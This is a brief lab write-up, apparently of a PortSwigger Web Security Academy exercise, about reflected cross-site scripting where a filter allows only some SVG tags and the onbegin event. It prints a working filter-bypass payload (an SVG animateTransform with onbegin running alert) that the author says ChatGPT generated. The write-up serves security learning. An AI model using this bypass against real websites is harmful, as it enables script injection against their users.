#reflected-xss 

Reflected XSS with some SVG markup allowed: [link](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.'

In this challenge, the WAF blocks all HTML tags except for SVG-related tags such as `<svg>`, `<rect>`, and `<animateTransform>`. Additionally, all attributes are blocked **except** for `onbegin`.

So, I asked **ChatGPT** to generate a payload using this information, and it provided me with the following code:

```javascript
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">

<rect width="100" height="100" fill="red">

<animateTransform

attributeName="transform"

type="scale"

from="1"

to="2"

dur="0.1s"

begin="0s"

onbegin="alert('XSS')"

repeatCount="1"

/>

</rect>

</svg>
```

i test it and it works :)